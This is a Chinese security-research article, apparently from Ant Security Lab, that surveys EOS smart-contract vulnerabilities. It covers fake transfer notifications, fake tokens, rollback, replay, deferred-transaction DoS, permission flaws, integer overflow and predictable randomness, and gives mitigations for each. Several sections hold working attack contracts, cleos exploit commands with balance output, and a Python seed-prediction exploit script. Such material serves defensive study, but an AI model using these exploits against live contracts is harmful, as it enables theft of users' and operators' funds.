**作者：天宸@蚂蚁安全实验室  
原文链接：<https://mp.weixin.qq.com/s/QAvFyfAetlwF3Vow-liEew>**

### 引言

EOS
在诞生之初的新闻报道里，被视为区块链3.0的代表。EOS的交易处理速度据称能够达到每秒百万量级，与其相比，以太坊每秒20多笔，比特币每秒7笔的处理速度实在是捉襟见肘。

据 2018 年10月 DappRadar 数据显示，排名前10的 EOS DAPP 中有6个属于博彩游戏，在所有的 EOS Dapp
中，博彩类游戏24小时交易量占比达到 84% 以上。EOS 玩家戏称博彩应用为菠菜应用。

2021 年 4 月，我们又统计了 Dappradar 列出的前 572 个 EOS Dapp，其中菠菜类应用
308个，占比超过总数的一半。时至今日菠菜应用仍然占据 EOS 的半壁江山，我们姑且称此篇系列文章为：菠菜应用篇。

![
](https://images.seebug.org/content/images/2021/05/42d3a61c-b9ba-4490-8e2b-61b6bdce008c.png-w331s)

EOS 公链上线初期，菠菜类应用火爆吸引了大量资金，但是项目合约代码安全性薄弱，成为攻击的重灾区。据安全厂商统计，EOS 上线第一年共发生超 60
起典型攻击事件，1-4 月为集中爆发期，占全年攻击事件的 67%，主要原因为 EOS 公链上菠菜类应用的持续火爆，加之项目合约代码安全性薄弱，导致黑客在多个
DApp 上就同一个漏洞进行连续攻击，手法主要以交易阻塞、回滚交易攻击，假 EOS 攻击，随机数破解等。本文对每一种攻击手段都做了复现。

此外，本文系统的梳理了其他类型的漏洞，并按照相关度的高低排列顺序，方便读者感受到漏洞之间的递进关系。

### 背景介绍

#### 什么是 EOS

EOS全称叫做“Enterprise Operation
System”，中文翻译是“企业操作系统”，是为企业级分布式应用设计的一款区块链操作系统。相比于比特币、以太坊平台性能低、开发难度大以及手续费高等问题，EOS拥有高性能处理能力、易于开发以及用户免费等优势，能极大的满足企业级的应用需求，诞生之初曾被誉为继比特币、以太坊之后区块链
3.0 技术。

为什么EOS性能高？这要得益于他的共识算法的设计。想知道他的共识算法？欢迎关注后续文章。

#### EOS 上的智能合约有什么特点

EOSIO智能合约由一组 Action 和类型定义组成。Action 指定并实现合约的行为。类型定义指定所需的内容和结构。开发合约时要对每一个action
实现对应的 action handler。action handler 的参数指定了接收的参数类型和数量。当向此合约发送 action
时，要发送满足要求的参数。

##### Action

EOSIO Action 主要在基于消息的通信体系结构中运行。客户端可以使用 cleos 命令，将消息发送（推送）到 nodeos 来调用
Action。也可以使用 EOSIO send 方法（例如eosio :: action :: send）来调用 Action。nodeos 将
Action 请求分发给合约的 WASM 代码。该代码完整地运行完，然后继续处理下一个 Action。

##### 通信模型

EOS体系是以通讯为基本的，Action 就是EOS上通讯的载体。EOSIO 支持两种基本通信模型：内联（inline）通信，如在当前交易中处理
Action，和延迟（defer）通信，如触发一笔将来的交易。

  * Inline通信

Inline 通信是指调用 Action 和被调用 Action 都要执行成功（否则会一起回滚）。(Inline communication takes
the form of requesting other actions that need to be executed as part of the
calling action.) Inline 通信使用原始交易相同的 scope 和权限作为执行上下文，并保证与当前 action 一起执行。可以被认为是
transaction 中的嵌套 transaction。如果 transaction 的任何部分失败，Inline 动作将和其他 transaction
一起回滚。无论成功或失败，Inline 都不会在 transaction 范围外生成任何通知。

  * Deferred通信

Deferred 通信在概念上等同于发送一个 transaction 给一个账户。这个 transaction 的执行是 eos
出快节点自主判断进行的，Deferrd 通信无法保证消息一定成功或者失败。

如前所述，Deferred 通信将在稍后由出快节点自行决定，从原始 transaction（即创建 Deferred 通信的
transaction）的角度来看，它只能确定创建请求是成功提交还是失败（如果失败，transaction 将立即失败）。

拥有这些背景知识，在理解下文的漏洞时会更加明了。

### EOS 特性导致的漏洞类型

#### 假 transfer 通知

##### 漏洞介绍

EOS 的合约可以通过 require_recipient(someone) 给其他合约发送转账通知。在其他合约的 transfer
中没有校验接受者是否为自己。来看一个真实的案例：

![
](https://images.seebug.org/content/images/2021/05/348748f3-2e72-4403-8140-eb264d1453b2.png-w331s)
图片来自慢雾科技

本次攻击中黑客创建了两个账户：攻击账户 ilovedice123 和攻击合约 whoiswinner1。游戏合约在 apply 里没有校验 transfer
action 的调用方必须是 eosio.token 或者是自己的游戏代币合约。攻击账户 ilovedice123 向攻击合约 whoiswinner1
转账后，EOSBet 合约的 transfer 函数被成功调用，误将攻击账户 ilovedice123 当成下注玩家，被套走了 142,845 个 EOS。

##### 漏洞示例

    
    
    void eosbocai2222::transfer(const name &from,
                                const name &to,
                                const asset &quantity,
                                const string &memo)
    {
        eostime playDiceStartat = 1540904400; //2018-10-30 21:00:00
        if ("buy token" == memo)
        {
            eosio_assert(playDiceStartat > now(), "Time is up");
            buytoken(from, quantity);
            return;
        }

transfer 函数没有校验 to!=_self

##### 攻击示例

攻击代码

    
    
    #include <eosio/eosio.hpp>
      #include <eosio/asset.hpp>
    
      using namespace eosio;
      using namespace std;
    
      class [[eosio::contract]] attack : public contract {
        public:
            using contract::contract;
    
            [[eosio::action]]
            void transfer( name from ,name to, asset quantity, string memo ) {
               require_recipient(name("eosdiceadmin"));
            }
    
      };
    
      extern "C" {
          void apply(uint64_t receiver, uint64_t code, uint64_t action) {
    
              if ((code == name("eosio.token").value) && (action == name("transfer").value)) {
              // if (action == name("transfer").value){
                  execute_action(name(receiver),name(code), &attack::transfer);
                  return;
              }
    
          }
      }

核心代码：require_recipient(name("eosdiceadmin"));

攻击前查看余额

    
    
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token ada
    410.0000 ADA
    1013.1741 BOB
    1000020.0000 SYS
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token bob
    899999998089.1271 BOB
    15.0000 SYS

ada 拥有 1013.1741 BOB 币

bob 拥有 899999998089.1271 BOB 币

发起假转账通知攻击

    
    
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos push action eosio.token transfer '["bob", "ada", "1.0000 BOB", "dice-50-eosdiceadmin"]' -p bob
    executed transaction: c4bc13c4d911354e4dab43d3b06bba4a1cdd33b576062fdf6d9189a6066d3c51  152 bytes  1527 us
    #   eosio.token <= eosio.token::transfer        {"from":"bob","to":"ada","quantity":"1.0000 BOB","memo":"dice-50-eosdiceadmin"}
    #           bob <= eosio.token::transfer        {"from":"bob","to":"ada","quantity":"1.0000 BOB","memo":"dice-50-eosdiceadmin"}
    。。。

攻击后查看余额

    
    
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token ada
    410.0000 ADA
    1014.1741 BOB
    1000020.0000 SYS
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token bob
    899999998090.1373 BOB
    15.0000 SYS

转账完毕之后 ada 和 bob 账号的币都增加了。

##### 规避建议

在 transfer 中加入 to 校验

    
    
    void eosbocai2222::transfer(const name &from,
                                const name &to,
                                const asset &quantity,
                                const string &memo)
    {
        //cant self or to cant self if you have more
         if (from == _self || to != _self)
         {
             return;
         }
    
        eostime playDiceStartat = 1540904400; //2018-10-30 21:00:00
        if ("buy token" == memo)
        {
            eosio_assert(playDiceStartat > now(), "Time is up");
            buytoken(from, quantity);
            return;
        }

#### 假 EOS 代币

##### 漏洞介绍

Apply 函数中没有校验 EOS 的发行者是否是真正的发行者 eosio.token ，导致攻击者可以发行同名的
EOS，进而触发被攻击合约的transfer函数，无成本获得真正的EOS。

##### 漏洞示例

    
    
    extern "C" { 
       void apply( uint64_t receiver, uint64_t code, uint64_t action ) { 
           if ((code == receiver ) || (action == name("transfer").value))
            {       
                code = name("eosdiceadmin").value;
                switch (action)
                {
                    EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init)(transfer))
                };
            }
       }    
    }

代码中没有校验 EOS 的发行者。

##### 攻击示例

创建一个假 EOS 币，向 eosdiceadmin 转账即可。

##### 规避建议

    
    
    extern "C"
    {
        void apply(uint64_t receiver, uint64_t code, uint64_t action)
    {
            if ((code == name("eosio.token").value) && (action == name("transfer").value))
            {
                execute_action(name(receiver),name("eosdiceadmin"), &eosbocai2222::transfer);
                return;
            }
    
            if (code != receiver)
                return;
    
            switch (action)
            {
                EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init))
            };
    
        }
    }

校验真正的发行者的身份 code == name("eosio.token").value

#### 假充值漏洞

假充值漏洞不仅在以太坊平台上存在，EOS 也存在。并且 EOS 上的攻击方式更多样化。

##### 漏洞介绍

此漏洞是因为项目方没有对交易的 status 状态进行校验，只是对交易是否存在作出了判断。但是交易可能执行失败，交易状态变成
hard_fail。hard_fail 的交易也可以在链上出现记录。所以，把交易是否存在作为充值成功的依据是不正确的。

##### 漏洞示例

EOS 游戏 Vegas Town (合约帐号 eosvegasgame)遭受攻击，损失数千 EOS。此攻击的一个最主要的点有两个，一个是
hard_fail，第二个是交易延迟导致 hard_fail。

hard_fail 是指：客观的错误并且错误处理器没有正确执行。简单来说就是出现错误但是没有使用错误处理器(error handler)处理错误，比方说使用
onerror 捕获处理，如果说没有 onerror 捕获，就会 hard_fail。

##### 攻击示例

只要对 cleos 中的一个参数设置就可以对交易进行延迟。但是这种交易不同于我们合约发出的
eosio_assert，没有错误处理。根据官方文档的描述，自然会变成 hard_fail。而且最关键的一个点是，hard_fail
会在链上出现记录，能通过项目方的校验。攻击者就无成本的充值成功了。

##### 规避建议

不要只是判断交易是否存在，还要判断下注交易是否成功执行。

### 回滚漏洞

回滚攻击常用于猜测彩票合约结果，攻击者先投注，然后监测开奖结果，如果不能中奖就回滚。反之则投注。攻击者不损失任何 EOS，从而达到稳赢的结果。回滚攻击在
EOS 上真实的发生过多次。

#### 针对 inline action 的回滚攻击

##### 漏洞介绍

该攻击的前提假设是中奖是实时检测和发放的，即被攻击合约转账的过程中会计算竞猜结果并即时发放奖励，如果中奖则恶意合约的EOS余额会增加。因而在"给竞猜合约转账"action后插入一个余额检测的action即可做到盈利检测。

背景知识：

上文提到，Action 就是 EOS 上消息（EOS 系统是以消息通信为基础的）的载体。如果想调用某个智能合约，那么就要给它发 Action 消息。

  * inline action

内联交易：多个不同的 action 在一个 transaction 中（在一个交易中触发了后续多个 Action ），在这个 transaction
中，只要有一个 action 异常，则整个 transaction 会失败，所有的 action 都将会回滚。

  * defer action

延迟交易：两个不同的 action 在两个 transaction 中，每个 action 的状态互相不影响。

##### 漏洞示例

![
](https://images.seebug.org/content/images/2021/05/1f9f5e0e-0ae9-42f8-8e9f-563732418a26.png-w331s)
图片来自区块链斜杠青年

##### 攻击示例

攻击合约

    
    
    #include <eosiolib/eosio.hpp>
    #include "eosio.token.hpp"
    
    using namespace eosio;
    
    class [[eosio::contract]] rollback : public contract {
      public:
          using contract::contract;
    
          [[eosio::action]]
          void roll( name to, asset value, string memo ) {
             asset balance = eosio::token::get_balance(
                     name("eosio.token"),
                     name("bob"),
                     symbol_code("BOB")
              );
             action(
                   permission_level{ _self,name("active")},
                   name("eosio.token"),
                   name("transfer"),
                   std::make_tuple(_self,to,value,memo)
             ).send();
    
            action(
                   permission_level{ _self,name("active")},
                   _self,
                   name("checkbalance"),
                   std::make_tuple(balance)
             ).send();
          }
    
          [[eosio::action]]
          void checkbalance( asset data) {
             auto newBalance = eosio::token::get_balance(
                     name("eosio.token"),
                     name("bob"),
                     symbol_code("BOB")
              );
    
             eosio_assert( newBalance.amount > data.amount,"lose");
    
          }
    };
    
    EOSIO_DISPATCH( rollback, (roll)(checkbalance))

攻击合约将所有lose的结果全部回滚，只接受win的结果，稳赢不输。

    
    
    Adas-Macbook-Pro:rollback ada$ cleos push action bob roll '["eosdiceadmin", "100.0000 BOB", "dice-50-eosdiceadmin"]' -p bob
    executed transaction: b25e84729de7f397d02c77465dce2345fb78c3bd62809dc30c9b7a5cf09caa45  144 bytes  2193 us
    #           bob <= bob::roll                    {"to":"eosdiceadmin","value":"100.0000 BOB","memo":"dice-50-eosdiceadmin"}
    #   eosio.token <= eosio.token::transfer        {"from":"bob","to":"eosdiceadmin","quantity":"100.0000 BOB","memo":"dice-50-eosdiceadmin"}
    。。。
    #           bob <= bob::checkbalance            {"data":"899999997988.1067 BOB"}
    warning: transaction executed locally, but may not be confirmed by the network yet         ]

##### 规避建议

延迟开奖，并且把开奖操作变成非原子操作。但是在后面一个攻击中我们可以看到，仅仅延迟开奖是不够的，攻击者还有其他的攻击手段。

#### 利用黑名单进行回滚攻击

##### 漏洞介绍

前一小节提到的攻击方式可以用延迟开奖的方法抵御，那么延迟开奖是不是能抵御其他类型的攻击方式呢？答案是否定的，本小节提到的黑名单的方式就可以对延迟开奖进行回滚攻击。

##### 背景知识

  1. EOS 采用的共识算法是 DPOS 算法，采用的是 21 个超级节点轮流出块的方式。全节点的作用是将收到的交易广播出去，然后超级节点将其进行打包。

  2. 从交易发出到打包到块，需要 3 分钟左右，未打包之前交易都可以回滚。

  3. 每一个 bp(超级节点)，都可以配置黑名单，黑名单的交易都会被回滚。

##### 漏洞示例

![
](https://images.seebug.org/content/images/2021/05/7a31e4c2-92aa-4f46-b41c-a07372c7b6d1.png-w331s)
图片来自慢雾科技

攻击者的账号在 bp 的黑名单里，那么攻击发起的投注交易会被 bp
回滚，投注的资金会返还给攻击者。而开奖交易是由项目方发起的，不会被回滚，攻击者可以获取到开奖奖励。攻击者以这种方式达到稳赢不输的目的。

##### 攻击示例

在 bp 节点上配置黑名单，之后正常发送投注交易。

##### 规避建议

  * 节点开启 read only 模式，防止节点服务器上出现未确认的块。

  * 建立开奖依赖，如订单依赖，开奖的时候判断订单是否存在，就算在节点服务器上开奖成功，由于在 bp 上下注订单被回滚，所以相应的开奖记录也会被回滚。

### EOS 上旧貌换新颜的传统漏洞类型

#### 重放漏洞 — 重放中奖消息

重放攻击是一种常见的攻击，多种平台都存在，在 EOS 平台上可以用于重放中奖消息。

##### 漏洞介绍

延迟开奖的方式遇上黑名单攻击就失效了，那么仅仅是建立开奖依赖是否就可以抵御所有的攻击呢？答案依然是否定的，这种方式能抵御黑名单攻击，但是不能抵御重放攻击。

##### 漏洞示例

![
](https://images.seebug.org/content/images/2021/05/6b1b9e2f-40da-426b-a09f-27e5c1926a26.png-w331s)
图片来自慢雾科技

攻击者的账号依然在 bp 的黑名单里，项目方节点建立了开奖依赖，如此一来攻击者发起的投注交易和开奖交易都会被 bp 节点回滚。

##### 攻击示例

所有的开奖逻辑都是在项目方的节点完成的，根据这一点，攻击者就可以在项目方节点广播交易时监听到开奖结果，如果这笔下注是中的，立马以同样的参数（种子）使用攻击者控制的同一合约帐号发起相同的交易，actor
为合约帐号本身，即可成功中奖。

##### 规避建议

  * 节点开启 read only 模式，防止节点服务器上出现未确认的块。

  * 建立开奖依赖，如订单依赖，开奖的时候判断订单是否存在，就算在节点服务器上开奖成功，由于在 bp 上下注订单被回滚，所以相应的开奖记录也会被回滚。

  * 项目方在玩家下注的时候校验交易中的 actor 和 from 是否是同一帐号。

#### DoS漏洞/交易延迟漏洞

DoS 的目的在于使目标系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。EOS 平台的延迟交易特性可导致 DoS。

##### 漏洞介绍

攻击者可以在下注时发起大量 delaytime=0
的恶意延迟交易，由于EOS执行交易采用FIFO策略，这些延迟交易肯定在开奖交易之前执行。这些延迟交易会在接下来的每个区块执行，在执行时会预测是否中奖，如果中奖就取消其他延迟交易，让开奖交易被执行。

否则不作处理，出块节点会继续执行其他延迟交易，从而导致开奖交易没法被执行，被推迟到下一个区块。只要这些恶意延迟交易足够多，开奖交易会被一直阻塞，直到攻击者中奖。Fishing和STACK
DICE 同时遭到黑客连续攻击，损失已经超过数百个EOS。

##### 漏洞示例

创建延时交易只需要为 delay_sec 属性赋值，值为要延迟的时间。

    
    
     template <typename... Args>
        void send_defer_action(Args &&... args)
    {
            transaction trx;
            trx.actions.emplace_back(std::forward<Args>(args)...);
            trx.delay_sec = 1;
            trx.send(next_id(), _self, false);
        }

##### 攻击示例

EOS限制一个transaction最长执行时间为10ms, 超时后就会报错，由于该交易报错失败，从而不消耗任何CPU资源，从而该攻击无成本。

因为 BP 节点有 API Node 防护，所以直接发起超时执行的交易（如，执行死循环）会被 API Node
防护过滤掉。攻击者采用了一个非常巧妙的方法绕过 API Node 防护 -- 发送延迟交易。

![
](https://images.seebug.org/content/images/2021/05/278ba57a-fccf-40a5-b900-94c21b24f082.png-w331s)
图片来自区块链斜杠青年

攻击者先发起一个含有延时交易的合法交易，然后合法交易就会成功执行并被广播进入BP Node, 由于这个合法交易会发起死循环的延时交易，从而 BP Node
在执行这个合法交易的时候也会生成这些死循环的恶意交易，因而死循环恶意交易进入网络核心层，大量吞噬了出块节点的CPU，导致 DoS。

##### 规避建议

  * 增加交易执行顺序的随机性。比如以太坊就是交易费高的先执行，由于这个交易费是交易发起者用户设置的，自然是随机的，不可预测的。

  * 增加执行超时交易成本。目前交易执行超时不会消耗任何CPU，可以考虑超时执行的交易也消耗CPU，这就要求这些超时交易记录在链上，同时可以增加透明性。

  * 限制延迟交易执行时间。

此攻击整理自：<https://blog.csdn.net/ITleaks/article/details/86471037>

### 权限控制类威胁

权限控制漏洞是一类通用问题。EOS 平台除了有无权限控制和权限控制不当问题之外，还比以太坊平台多一类合约滥用用户权限的问题，这是因为 EOS
平台和以太坊平台的权限模型不同。

#### 合约对用户无权限控制 — transfer 函数

这类问题表现形式就是敏感函数没有做权限控制。

##### 漏洞介绍

敏感操作没有权限校验是常见的漏洞类型，EOS 平台的表现方式是敏感操作没有调用 require_auth(xx)
进行权限校验。如，没有校验from是否为调用者本人，这样就会导致任何一个人都可以转移其他人的代币，不需要任何授权。

##### 漏洞示例

转账操作无访问控制

    
    
    void token::transfer( const name&    from,
                          const name&    to,
                          const asset&   quantity,
                          const string&  memo )
    {
        check( from != to, "cannot transfer to self" );
        check( is_account( to ), "to account does not exist ");
    
        auto sym = quantity.symbol.code();
        stats statstable( get_self(), sym.raw() );
        const auto& st = statstable.get( sym.raw() );
    
        require_recipient( from );
        require_recipient( to );
    
        check( quantity.is_valid(), "invalid quantity" );
        check( quantity.amount > 0, "must transfer positive quantity" );
        check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
        check( memo.size() <= 256, "memo has more than 256 bytes " );
    
        sub_balance( from, quantity );
        add_balance( to, quantity, from );
    }

##### 攻击示例

    
    
    Adas-Macbook-Pro:auth.token ada$ cleos push action fortestvulns transfer '["ada", "bob", "10.0000 ADA", "ada to bob 10"]' -p bob
    executed transaction: ee4105d6f6fcba150c345197f5f637f98c1f1adaa856efd0f4764523b14d41ea  144 bytes  218 us
    #  fortestvulns <= fortestvulns::transfer       {"from":"ada","to":"bob","quantity":"10.0000 ADA","memo":"ada to bob 10"}
    #           ada <= fortestvulns::transfer       {"from":"ada","to":"bob","quantity":"10.0000 ADA","memo":"ada to bob 10"}
    #           bob <= fortestvulns::transfer       {"from":"ada","to":"bob","quantity":"10.0000 ADA","memo":"ada to bob 10"}

不需要提供 ada 账号的签名信息就可以转账给 bob。存在权限问题。不仅如此，只要随便提供一个账号，甚至不是 ada，也不是 bob，均可以转账成功。

##### 规避建议

使用require_auth(from)校验资产转出账户与调用账户是否一致。加了 require_auth(from)之后，必须要提供转出账户的签名才可以。

#### 合约对用户权限控制不当 — apply 函数

这类问题通常发生在有安全意识，但是安全经验不足的项目组。虽然做了权限控制，但是并没有做对。

##### 漏洞介绍

Apply 函数在 EOS 合约里面相当于是入口函数，有一些权限校验的操作会放在 Apply
函数里面。如果校验不当，则会导致敏感接口对外暴露。如，合约里面有转账 transfer 等敏感接口。

##### 漏洞示例

    
    
    extern "C" { 
       void apply( uint64_t receiver, uint64_t code, uint64_t action ) { 
           if ((code == receiver ) || (action == name("transfer").value))
            {       
                code = name("eosdiceadmin").value;
                switch (action)
                {
                    EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init)(transfer))
                };
            }
       }    
    }

if ((code == receiver ) || (action == name("transfer").value))
这句代码存在权限校验不严格的问题，通过合约发送请求可以满足 code == receiver 条件。

##### 攻击示例

    
    
    #include <eosiolib/eosio.hpp>
    #include <eosiolib/asset.hpp>
    
    using namespace eosio;
    using namespace std;
    class [[eosio::contract]] call : public contract {
      public:
          using contract::contract;
          [[eosio::action]]
          void attack( name to, asset value, string memo ) {
    
             action(
                   permission_level{ _self,name("active")},
                   name("eosdiceadmin"),
                   name("transfer"),
                   std::make_tuple(_self,to,value,memo)
             ).send();
    
          }
    
    };
    EOSIO_DISPATCH( call, (attack))

攻击者部署合约，合约里发送 inline action。关键点是设置 name("eosdiceadmin"), 以满足校验条件。

攻击前查看余额

    
    
    Adas-Macbook-Pro:calltransfer ada$ cleos get currency balance eosio.token alice
    290.0000 ADA
    1001.0674 BOB
    10065.0000 SYS

进行转账攻击

    
    
    Adas-Macbook-Pro:calltransfer ada$ cleos push action alice attack '["eosdiceadmin", "100.0000 BOB", "dice-50-eosdiceadmin"]' -p alice
    executed transaction: 515affd83784559dfb3e92edd3d22edc669243cd634411001b020e5787d4c959  144 bytes  2026 us
    。。。

攻击后查看余额，可以看到攻击者 alice 调用敏感接口成功。获得了 1202.0878 BOB - 1001.0674 BOB = 201.0204
BOB 币。

    
    
    Adas-Macbook-Pro:calltransfer ada$ cleos get currency balance eosio.token alice
    290.0000 ADA
    1202.0878 BOB
    10065.0000 SYS

##### 规避建议

绑定每个 code 和 action，如 transfer 只能对应 eosio.token 。

    
    
    extern "C"
    {
        void apply(uint64_t receiver, uint64_t code, uint64_t action)
    {
            if ((code == name("eosio.token").value) && (action == name("transfer").value))
            {
                execute_action(name(receiver),name("eosdiceadmin"), &eosbocai2222::transfer);
                return;
            }
    
            if (code != receiver)
                return;
    
            switch (action)
            {
                EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init))
            };
            //eosio_exit(0);
        }
    }

#### 合约滥用用户权限 — eosio.code 权限

eosio.code 权限是 dawn4.0 后新增的内部特殊权限，用来加强 inline action 的安全性。inline action
简单来说就是action 调用另外一个 action，具体来说就是一个智能合约调用另外一个智能合约。inline action 需要向用户申请
eosio.code 权限。用户只有授权 eosio.code 权限给合约之后，合约才可以以用户身份调用另一个合约。

##### 漏洞介绍

若用户错误的把自身的 active 权限授予其他合约的 eosio.code 权限，其他合约就可以以用户的身份执行一些敏感操作，如转账操作。

##### 漏洞示例

Fomo 3D 狼人游戏就是一个申请用户 active 权限的游戏。用户授予合约账号 active
权限之后，合约可以自主升级，合约升级为恶意版本之后。合约账号就可以以用户的身份执行敏感操作。但是真实世界中，Fomo 3D
的项目方并没有作恶，而是让用户收回权限。

##### 攻击示例

任何申请用户 active 权限的场景。由于合约可以升级，即使授权版本的合约经过审计，也无法保证后续升级合约不作恶。所以任何申请用户 active
权限的场景都会存在威胁。

##### 规避建议

用户不得把 active 权限授权给不信任的合约。

### 整数溢出

整数溢出的问题是最为常见的安全问题。[智能合约安全系列——百万合约之母以太坊的漏洞攻防术（下集）](https://paper.seebug.org/1545/
"智能合约安全系列——百万合约之母以太坊的漏洞攻防术（下集）")已经介绍了整数溢出的几种形式。

本文主要分享一下 EOS 平台的案例。EOS 合约使用 C 语言编写，整数溢出在 C 语言里非常常见。

##### 漏洞介绍

整数溢出发生的原因是因为寄存器能表示的数值位数有限，当存储的数值大于能表示的最大范围后，数值发生溢出，或称为反转。最大值溢出会变成最小值，最小值溢出为变成最大值。

    
    
    void token::transfer( const name&    from,
                          const name&    to,
                          const asset&   quantity,
                          const string&  memo )
    {
        name to2 = to; //模拟batchtransfer
        check( from != to, "cannot transfer to self" );
    
        auto sym = quantity.symbol.code();
        stats statstable( get_self(), sym.raw() );
        const auto& st = statstable.get( sym.raw() );
    
        check( quantity.is_valid(), "invalid quantity" );
        check( quantity.amount > 0, "must transfer positive quantity" );
        check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
        check( memo.size() <= 256, "memo has more than 256 bytes " );
    
        uint32_t amount = quantity.amount * 2; //溢出
        asset totalquantity = asset(amount, quantity.symbol);
    
        sub_balance( from, totalquantity );
        add_balance( to, quantity, from );
        add_balance( to2, quantity, from );
    }

##### 攻击示例

分析可知，因为这里计算转账额度之和使用的是uint32类型，所以它的范围是0~4294967295，要乘以2后刚好满足溢出的话，这个值为4294967295/2+1=2147483648，所以转2147483648个币就可以绕过余额限制来超额铸币。

    
    
    Adas-Macbook-Pro:overflow.token ada$ cleos push action overflow transfer '["overflow", "alice", "2147483648.0000 VULT", "memo"]' -p overflow
    executed transaction: 7db6cabf658d166cf362dadf99a95940ea4bdb8bae46d8bdd080c8314a665094  136 bytes  216 us
    #      overflow <= overflow::transfer           {"from":"overflow","to":"alice","quantity":"2147483648.0000 VULT","memo":"memo"}
    #         alice <= overflow::transfer           {"from":"overflow","to":"alice","quantity":"2147483648.0000 VULT","memo":"memo"}
    warning: transaction executed locally, but may not be confirmed by the network yet         ] 
    Adas-Macbook-Pro:overflow.token ada$

转账完毕之后查看余额

    
    
    Adas-Macbook-Pro:overflow.token ada$ cleos get currency balance overflow alice
    4294967298.0000 VULT
    Adas-Macbook-Pro:overflow.token ada$ cleos get currency balance overflow overflow
    9998.0000 VULT

创建者 overflow 账号的余额没有受到影响，Alice 的账号余额凭空变成 4294967298.0000
VULT，已经超过最开始创建的币的数量。攻击成功。

##### 规避建议

涉及到算术运算的地方要进行检查，或者交与区块链安全团队进行审计。

### 随机数问题

EOS 游戏的随机数问题非常多，随机数反反复复被攻击也是 EOS Dapp
被广大游戏玩家诟病之处。现实世界中随机数的攻击案例非常多，且项目方和黑客的攻防升级也很有看点，这些就留给感兴趣的读者自己探索。本文以 EOSDice
随机数被攻击的例子来讨论随机数问题。

##### 漏洞介绍

随机数经常被用于竞猜类游戏，如果随机数可以被预测，那么玩家就可以稳赢不输。EOS 有大量游戏类应用，因为随机数被破解，导致项目方损失了大量代币。

##### 漏洞示例

因为 EOSDice 的合约已经开源，我们从 Github
合约源码（查看链接了解：https://github.com/loveblockchain/eosdice/blob/f1ba04ea071936a8b5ba910b76597544a9e839fa/eosbocai2222.hpp）找到了
EOSDice 的随机数算法，代码如下：

    
    
    uint8_t random(account_name name, uint64_t game_id)
    {
        asset pool_eos = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
        auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount;
    
        const char *mixedChar = reinterpret_cast<const char *>(&mixd);
    
        checksum256 result;
        sha256((char *)mixedChar, sizeof(mixedChar), &result);
    
        uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
        return (uint8_t)(random_num % 100 + 1);
    }

可以看到，EOSDice 官方的随机数算法为 6 个随机数种子进行数学运算，再哈希，最后再进行一次数学运算。EOSDice 官方选择的随机数种子为：

  * tapos_block_prefix # ref block 的信息

  * tapos_block_num # ref block 的信息

  * account_name # 玩家的名字

  * game_id # 本次游戏的游戏 id，从 1 自增

  * current_time # 当前开奖的时间戳

  * pool_eos # 本合约的 EOS 余额

具体种子在第一篇文章[智能合约漏洞系列 -- 运行平台科普篇](https://paper.seebug.org/1546/ "智能合约漏洞系列 --运行平台科普篇")EOS 交易结构的时候已经解释过意义，结论就是这些因素都可以被预测。

##### 攻击示例

random.cpp 主要是计算随机数。

以下脚本负责计算种子值：

    
    
    import requests
    import json
    import os
    import binascii
    import struct
    import sys
    
    game_id = sys.argv[1]
    # get tapos block num
    url = "http://127.0.0.1:8888/v1/chain/get_info"
    response = requests.request("POST", url)
    res = json.loads(response.text)
    last_block_num = res["head_block_num"]
    # get tapos block id
    url = "http://127.0.0.1:8888/v1/chain/get_block"
    data = {"block_num_or_id":last_block_num}
    response = requests.post(url, data=json.dumps(data))
    res = json.loads(response.text)
    last_block_hash = res["id"]
    # get tapos block prefix
    block_prefix = struct.unpack("<I", binascii.a2b_hex(last_block_hash)[8:12])[0]
    # attack
    cmd = '''cleos push action ada hi '["%s","%s","%s"]' -p ada ''' % (str(game_id), str(block_prefix), str(last_block_num))
    os.system(cmd)

##### 规避建议

不使用可预测的随机源做随机数种子。

### 小结

本文介绍了 EOS 平台的漏洞类型，这些漏洞既有 EOS 平台的独特之处，如 eosio.code 权限问题，transfer
假通知问题；又有传统安全威胁的影子，如 eosio.code 属于权限管理问题；还有其他平台的同类问题，如 transfer
假通知是假转账问题的一种，以太坊平台上也存在。

相较与以太坊，目前没有发现 EOS
特有的危险函数导致的攻击，也尚未出现像重入漏洞这种高平台辨识度的漏洞类型。但EOS生态也相对年轻，更多的安全挑战和解决方案还有待安全同行们共同进一步深入研究，也欢迎读者一起讨论。

### 参考文献

<https://eos.live/detail/16609>

<https://www.chainnews.com/articles/310717546581.htm>

<https://github.com/EthFans/wiki/wiki/智能合约>

<https://github.com/bitcoinbook/bitcoinbook/blob/develop/ch06.asciidoc>

<https://github.com/bitcoinbook/bitcoinbook/blob/develop/ch07.asciidoc>

<https://solidity.readthedocs.io/en/v0.5.12/050-breaking-changes.html>

<https://zhuanlan.zhihu.com/p/33750599>

<https://www.ibm.com/developerworks/cn/cloud/library/cl-lo-hyperledger-fabric-practice-analysis2/index.html>

<https://xz.aliyun.com/t/3268>

<https://blog.sigmaprime.io/solidity-security.html#ether-vuln>

<https://www.sciencedirect.com/science/article/abs/pii/S157411921830720X?via%3Dihub>

<http://www.caict.ac.cn/kxyj/qwfb/bps/201809/P020180919411826104153.pdf>

<https://www.bangcle.com/upload/file/20181130/15435463681918.pdf>

<https://www.chainnews.com/articles/729138868600.htm#>

<https://paper.seebug.org/631/#44-dividenddistributor>

<https://bihu.com/article/1640996874>

<http://www.sjtubsrc.net/>

<http://ufile.shwilling.com/2018bscsawp.pdf>

<https://yuque.antfin-inc.com/antchain/fhisdg/hynpu7>

<https://www.zastrin.com/courses/ethereum-primer/lessons/1-5>

